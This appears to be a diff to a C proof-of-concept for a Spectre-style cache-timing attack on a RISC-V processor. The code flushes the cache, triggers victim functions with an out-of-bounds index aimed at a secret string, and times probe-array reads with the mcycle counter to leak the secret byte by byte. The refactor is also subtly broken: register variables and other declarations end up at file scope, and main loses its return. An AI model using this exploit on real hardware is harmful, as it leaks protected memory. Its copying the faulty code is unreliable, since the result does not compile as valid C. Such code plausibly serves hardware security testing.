@@ -93,13 +93,8 @@ uint8_t probeArray[ARRAY_SIZE_FACTOR * ARRAY_STRIDE];
 #define MIXER_A 65 // min 65. 163, 167, 127, 111. Must be larger than 64.
 #define MIXER_B 1 // Arbitrary as long as larger than 0.
 
-int main(void){
-
-	char* secretString = SECRET_STRING;
-
-	uint32_t attackIdx = (uint32_t)(secretString - (char*)guideArray);
 	uint32_t mixed_i;
-	register uint32_t start, diff; // Use register variable to reduce time.
+	register uint32_t start, diff; // Use register variables to reduce access time.
 	uint32_t dummy;
 
 	// Get the highest and second highest hit values in results().
@@ -108,6 +103,29 @@ int main(void){
 	static uint32_t results[RESULT_ARRAY_SIZE];
 	uint8_t output[2];
 	uint32_t hitArray[2];
+
+void cacheAttack(){
+
+			// Read out probeArray and see the hit secret value.
+			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
+			for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
+				mixed_i = ((i * MIXER_A) + MIXER_B) & (ARRAY_SIZE_FACTOR-1);
+				start = READ_CSR(mcycle);
+				//There should be nothing between these 2 rows, otherwise you need to adjust the threshold. 
+				dummy &= probeArray[mixed_i * ARRAY_STRIDE];
+				diff = (READ_CSR(mcycle) - start);
+
+				// Condition: interval of time is smaller than the threshold.
+				if ((uint32_t)diff < CACHE_HIT_THRESHOLD){
+					results[mixed_i]++; /* Cache hit */
+				}
+			}
+}
+void main(){
+
+	char* secretString = SECRET_STRING;
+
+	uint32_t attackIdx = (uint32_t)(secretString - (char*)guideArray);
 
     for (int i = 0; i < sizeof(guideArray); i++){
         guideArray[i] = 1;
@@ -133,7 +151,7 @@ int main(void){
     *outputAddr = '=';
     *outputAddr = '\n';
 
-	for(uint32_t len = 0; len < (SECRET_LENGTH); len++){
+	for(uint32_t len = 0; len < SECRET_LENGTH; len++){
 	
 		// Clear results for every character.
 		for(uint32_t cIdx = 0; cIdx < RESULT_ARRAY_SIZE; cIdx++){
@@ -148,8 +166,7 @@ int main(void){
 			flushCache((uint32_t)probeArray, sizeof(probeArray));
 
 			victimFuncInit(attackIdx);
-			int n=len;
-			switch (n) {
+			switch (len) {
 				case 0:
 					victimFunc_00(attackIdx);
 					break;
@@ -168,21 +185,7 @@ int main(void){
 				//default:
 				//	break;
 			}
-
-			// Read out probeArray and see the hit secret value.
-			/* Time reads. Order is slightly mixed up to prevent stride prediction (prefetching). */
-			for (int i = 0; i < ARRAY_SIZE_FACTOR; i++) {
-				mixed_i = ((i * MIXER_A) + MIXER_B) & (ARRAY_SIZE_FACTOR-1);
-				start = READ_CSR(mcycle);
-				//There should be nothing between these 2 rows, otherwise you need to adjust the threshold. 
-				dummy &= probeArray[mixed_i * ARRAY_STRIDE];
-				diff = (READ_CSR(mcycle) - start);
-
-				// Condition: interval of time is smaller than the threshold.
-				if ((uint32_t)diff < CACHE_HIT_THRESHOLD){
-					results[mixed_i]++; /* Cache hit */
-				}
-			}
+			cacheAttack();
 		}
 
 		/* Use junk so above 'dummy=' row won't get optimized out. Order of the following insturctions seems to be in a fixed position. */
@@ -224,5 +227,5 @@ int main(void){
     *outputAddr = '=';
     *outputAddr = '\n';
 
-	return 0;
+//	return 0;
 }
